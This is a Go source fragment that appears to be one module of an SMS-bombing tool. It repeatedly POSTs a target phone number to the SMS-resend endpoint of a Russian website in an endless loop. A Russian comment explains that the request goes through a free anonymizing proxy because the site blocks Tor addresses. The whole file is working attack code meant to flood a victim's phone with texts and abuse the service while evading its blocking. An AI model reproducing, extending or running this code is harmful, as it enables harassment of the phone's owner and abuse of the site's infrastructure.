package main

func wer() {
	req := newreq()
	// https://wer.ru/ajax/repet_send_sms.php через анонимайзер, т.к. этот сервис блокирует ip адреса tor
	req.SetRequestURI("https://www.hidemyass-freeproxy.com/proxy/en-ww/aHR0cHM6Ly93ZXIucnUvYWpheC9yZXBldF9zZW5kX3Ntcy5waHA")
	req.Header.SetMethod("POST")
	req.SetBodyString("PHONE=%2B" + num[0:1] + "%20(" + num[1:4] + ")%20" + num[4:7] + "-" + num[7:9] + "-" + num[9:])
	req.Header.SetContentLength(0)

	for do {
		client.Do(req, nil)
	}
}
